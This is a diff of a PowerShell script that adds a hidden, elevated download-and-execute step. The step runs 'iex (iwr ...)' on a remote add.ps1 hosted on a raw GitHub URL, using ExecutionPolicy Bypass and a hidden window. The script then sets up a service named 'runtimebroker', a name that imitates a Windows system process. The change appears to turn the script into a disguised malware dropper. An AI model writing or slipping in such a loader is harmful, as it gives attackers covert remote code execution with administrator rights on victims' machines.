@@ -1,9 +1,10 @@
+$addURL = "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/add.ps1"
 function Test-Admin {
     $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 if (-not (Test-Admin)) {
-    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex (iwr '$addURL' -UseBasicParsing)`""
     exit
 }
 $serviceName = "runtimebroker"
